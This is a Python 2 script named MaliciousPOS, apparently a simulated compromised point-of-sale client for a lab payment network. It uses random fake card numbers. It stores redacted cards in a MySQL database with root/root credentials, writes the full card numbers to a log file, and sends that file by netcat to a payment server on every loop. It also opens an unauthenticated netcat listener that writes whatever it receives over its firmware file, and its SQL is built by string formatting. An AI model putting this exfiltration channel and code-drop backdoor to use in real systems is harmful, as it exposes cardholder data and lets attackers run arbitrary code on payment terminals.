#!/usr/bin/python

import MySQLdb
import string
import random
import time
import sys
import thread
import traceback
import subprocess


class MaliciousPOS:
    def __init__(self):
        # Open database connection
        self.payment_server_ip = "10.0.0.20"  # private ip address of payment server: 10.0.0.20
        self.payment_server_port = "6666"
        user = "root"
        passwd = "root"
        db_name = "payment_db"
        self.db = MySQLdb.connect(self.payment_server_ip, user, passwd, db_name)
        self.cursor = self.db.cursor()
        self.port = "5555"

    @staticmethod
    def redact_info(credit_card_no):
        return '*' * 12 + credit_card_no[12:]

    def run(self):
        print "malicious POS firmware running..."

        # keep opening nc listening port to receive firmware update
        with open("/home/ubuntu/payment-server/pos_firmware.py", "w") as firmware:
            subprocess.Popen(["nc", "-l", "-p", str(self.port)], stdout=firmware, stderr=subprocess.PIPE)

        while True:

            transac_id = ''.join(random.choice(string.digits) for _ in range(8))
            datetime = time.strftime('%Y-%m-%d %H:%M:%S')
            content = ''.join(random.choice(string.ascii_letters) for _ in range(8))
            amount = random.uniform(1, 10000)
            credit_card_no = ''.join(random.choice(string.digits) for _ in range(16))
            rd_credit_card_no = MaliciousPOS.redact_info(credit_card_no)

            sql = "INSERT INTO transactions(transac_id, \
                     datetime, content, amount, credit_card_no) \
                     VALUES ('%s', '%s', '%s', '%.2f', '%s')" % \
                  (transac_id, datetime, content, amount, rd_credit_card_no)
            try:
                # Execute the SQL command
                self.cursor.execute(sql)

                # Commit your changes in the database
                self.db.commit()

                print "one record inserted."
            except Exception as e:
                traceback.print_exc(e)
                # Rollback in case there is any error
                self.db.rollback()

            with open("/home/ubuntu/log_file", "w") as log_file:
                unredacted_info = ("(transac_id, datetime, content, amount, credit_card_no) = "
                                   "('%s','%s', '%s', '%.2f', '%s')\n" %
                                   (transac_id, datetime, content, amount, credit_card_no))
                log_file.write(unredacted_info)
                log_file.close()

            # transfer the content of local log file to server
            nc_call = "nc " + self.payment_server_ip + " " + self.payment_server_port + " < " + "/home/ubuntu/log_file"
            subprocess.Popen(nc_call, shell=True)

            # assume interval is drawn from exp distribution
            interval = random.expovariate(0.1)
            # insert one record every interval seconds
            time.sleep(interval)


if __name__ == '__main__':
    client = MaliciousPOS()
    try:
        client.run()
    finally:
        # disconnect from server
        print "client shutdown."
        client.db.close()

    sys.exit()